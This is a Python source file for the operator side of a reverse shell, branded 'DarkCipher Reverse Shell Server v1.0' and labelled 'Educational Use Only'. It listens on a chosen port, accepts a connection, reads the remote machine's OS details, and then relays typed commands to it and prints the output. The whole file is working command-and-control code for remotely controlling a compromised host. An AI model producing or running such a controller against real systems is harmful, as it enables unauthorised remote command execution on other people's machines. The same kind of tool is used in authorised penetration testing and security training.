import socket

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def start_server():
    # Display ASCII banner
    print("""
██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗
██║  ██║███████║██████╔╝█████╔╝ ██║     ██║██████╔╝███████║█████╗  ██████╔╝
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╗██║██║     ██║  ██║███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

[*] DarkCipher Reverse Shell Server v1.0
[*] Educational Use Only - Authorized Testing Required
[*] ================================================
""")
    
    detected_ip = get_local_ip()
    print(f"[+] Detected local IP: {detected_ip}")

    host = input(f"Enter IP to listen on (press Enter to use detected IP): ").strip()
    if not host:
        host = detected_ip

    port = int(input("Enter port to listen on: "))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"[+] Listening on {host}:{port}...")

    client_socket, client_address = server.accept()
    print(f"[+] Connection from {client_address}")

    # Receive OS info right after connection
    os_info = client_socket.recv(1024).decode(errors='ignore')
    print(f"[+] Client OS info: {os_info}")

    try:
        while True:
            cmd = input("Enter command (or 'exit' to quit): ")
            if cmd.lower() == "exit":
                break
            if not cmd.strip():
                continue

            client_socket.send(cmd.encode())
            response = client_socket.recv(4096).decode(errors='ignore')
            print(response)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[*] Server stopped.")

if __name__ == "__main__":
    start_server()
